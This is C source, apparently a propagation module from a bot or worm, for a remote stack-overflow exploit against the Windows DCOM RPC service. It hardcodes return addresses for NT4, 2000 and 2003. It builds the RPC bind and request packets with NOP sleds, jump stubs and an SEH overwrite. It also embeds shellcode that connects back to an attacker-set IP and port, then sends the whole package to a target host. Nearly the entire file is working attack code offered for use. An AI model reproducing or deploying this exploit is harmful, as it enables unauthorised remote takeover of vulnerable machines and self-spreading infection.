#include "includes.h" 
#include "extern.h" 
#pragma comment(linker, "/IGNORE:4700 ")

DWORD				dwSHellcodeIpAddress;	
char				szSHellcodeIpAddress[16];
unsigned short		usSHellcodePort;
char szDcom2BindString[] =
{
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\xB8\x4A\x9F\x4D\x1C\x7D\xCF\x11\x86\x1E\x00\x20\xAF\x6E\x7C\x57"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00"
};

char szDcom2Header[] =
{
	"\x05\x00\x00\x03\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00"
};

char szDcom2Request1[] =
{
	"\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x7D\x75\x75"
	"\x40\xEB\xC6\x47\xBC\x71\x4E\xA7\x1C\xD0\xB5\x97\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x09\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00"
	"\x5C\x00\x5C\x00" // nops & code here...
};

char szDcom2Request2[] =
{
	"\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x68\x1c\x09\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xc0\x00\x00\x00\x00\x00\x00\x46\x01\x00\x00\x00\x01\x00\x00\x00"
	"\x07\x00"
};

// jump to [esp-4] - (distance to SHellcode)
char szJmpToSHellcode[] =
{
	"\x8b\x44\x24\xfc"		// mov eax,[esp-0x4]

	"\x05\xe0\xfa\xff\xff"	// add eax,0xfffffae0 (sub eax, 1312)
	"\xff\xe0"				// jmp eax
};

// jump to [ebp+0x30] - (distance to SHellcode)
char szJmpSHellcode2003[] =
{
	"\x8b\x45\x30"			// mov eax,[ebp+0x30]
	"\x05\x24\xfb\xff\xff"	// add eax,0xfffffb24 (sub 1244)
	"\xff\xe0"				// jmp eax
};

// when attacking NT 4.0 SP6, jump over 2000/XP return
char szDcom2Jmp1[] = "\xeb\x10\xeb\x19";
char szDcom2Jmp2[] = "\xeb\x04\xff\xff\xff\xff";
char szDcom2Jmp3[] = "\xeb\x04\xeb\x04";
char szDcom2Jmp4[] = "\xeb\x04\xff\xff\xff\xff";
char szDcom2JmpE[] = "\x5c\x00\x41\x00\x00\x00\x00\x00\x00\x00";

// will be all used in 1 request
DWORD dwDcom2Offsets[] = 
{
	0x77f33723, // WinNT4 return address (esi)
	0x7ffde0eb, // writable address on Win2000 and jmp for WinNT4
	0x0018759f, // Win2000 return address (ebx)
	0x01001c59, // Win2003 #1
	0x001b0b0b  // Win2003 #2
};

void Dcom2(ExploitInfo_s* pExploitInfo)
{
	char szReceiveBuffer[4096], szShellcode[512], szXPSEH[360], szRequestBuffer[2048];
	SOCKET sSocket;

	// Request shellcode from stack
	DWORD dwSHellcodeSize = GenerateEncodedShellcode(szShellcode, sizeof(szShellcode), 
		dwSHellcodeIpAddress, usSHellcodePort, 
		pExploit[pExploitInfo->dwExploitId].dwExploitId, "\r\n\\_/.", sizeof("\r\n\\_/."));

	if (!dwSHellcodeSize) 
		ExitThread(0);

	// Initialise and fill SockAddr and Socket struct
	SOCKADDR_IN sinSockAddrIn;
	memset(&sinSockAddrIn, 0, sizeof(sinSockAddrIn));

	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_addr.s_addr	= pExploitInfo->dwRemoteIp;
	sinSockAddrIn.sin_port			= htons(pExploitInfo->usRemotePort);

	if(!(sSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)))
		ExitThread(0);
	
	if(connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn)) == SOCKET_ERROR)
		ExitThread(0);
	
	if(send(sSocket, szDcom2BindString, sizeof(szDcom2BindString) - 1, 0) == SOCKET_ERROR)
		ExitThread(0);
	
	if(recv(sSocket, szReceiveBuffer, sizeof(szReceiveBuffer), 0) == SOCKET_ERROR)
		ExitThread(0);

	for (int i = 0; i < 360; i++)
		szXPSEH[i] = nick2('a', 'z');
	
	// Fill the code in on the right position of the buffer
	memcpy(szXPSEH + 236, szJmpSHellcode2003,					sizeof(szJmpSHellcode2003)-1);
	memcpy(szXPSEH + 246, "\xEB\xF4",							2);
	memcpy(szXPSEH + 250, (char *)&dwDcom2Offsets[4],			4);
	memcpy(szXPSEH + 306, "\xEB\x06",							2);
	memcpy(szXPSEH + 310, (char *)&dwDcom2Offsets[3],			4);
	memcpy(szXPSEH + 314, &szJmpToSHellcode,					sizeof(szJmpToSHellcode)-1);

	//| Initialise variables for final request
	int iPos = 0;

	// Build request buffer package
	memcpy(szRequestBuffer + iPos, szDcom2Header,				sizeof(szDcom2Header)-1); 
	iPos += sizeof(szDcom2Header)-1;
	memcpy(szRequestBuffer + iPos, szDcom2Request1,				sizeof(szDcom2Request1)-1); 
	iPos += sizeof(szDcom2Request1)-1;
	memset(szRequestBuffer + iPos, 0x90,						32);
	iPos += 32;
	memcpy(szRequestBuffer + iPos, szDcom2Jmp1,					sizeof(szDcom2Jmp1)-1);
	iPos += sizeof(szDcom2Jmp1)-1;
	memcpy(szRequestBuffer + iPos, (char *)&dwDcom2Offsets[2],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos, (char *)&dwDcom2Offsets[0],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos, (char *)&dwDcom2Offsets[1],	4); 
	iPos += 4;
	memset(szRequestBuffer + iPos, 0x90,						88);
	iPos += 88;
	memcpy(szRequestBuffer + iPos, szDcom2Jmp2,					sizeof(szDcom2Jmp2)-1); 
	iPos += sizeof(szDcom2Jmp2)-1;
	memset(szRequestBuffer + iPos, 0x90,						8);
	iPos += 8;
	memcpy(szRequestBuffer + iPos, szDcom2Jmp3,					sizeof(szDcom2Jmp3)-1);
	iPos += sizeof(szDcom2Jmp3)-1;
	memset(szRequestBuffer + iPos, 0x90,						4); 
	iPos += 4;
	memcpy(szRequestBuffer + iPos, szDcom2Jmp4,					sizeof(szDcom2Jmp4)-1); 
	iPos += sizeof(szDcom2Jmp4)-1;
	memset(szRequestBuffer + iPos, 0x90,						998 - dwSHellcodeSize);
	iPos += 998 - dwSHellcodeSize;
	memcpy(szRequestBuffer + iPos, szShellcode,					dwSHellcodeSize); 
	iPos += dwSHellcodeSize;
	memcpy(szRequestBuffer + iPos, szXPSEH,						sizeof(szXPSEH));
	iPos += sizeof(szXPSEH);
	memcpy(szRequestBuffer + iPos, szDcom2JmpE,					sizeof(szDcom2JmpE)-1);
	iPos += sizeof(szDcom2JmpE)-1;
	memcpy(szRequestBuffer + iPos, szDcom2Request2,				sizeof(szDcom2Request2)-1); 
	iPos += sizeof(szDcom2Request2)-1;

	// Fill in the correct sizes in the buffer
	*PDWORD(szRequestBuffer + 8)  = iPos;
	*PDWORD(szRequestBuffer + 16) = iPos - (sizeof(szDcom2Header)-1);

	// Send bindstring to initialise a RPC session
	if(send(sSocket, szRequestBuffer, iPos, 0) == SOCKET_ERROR)
		ExitThread(0);
	
	// Read the respond
	if(recv(sSocket, szReceiveBuffer, sizeof(szReceiveBuffer), 0) == SOCKET_ERROR)
		ExitThread(0);

	ExitThread(1);
}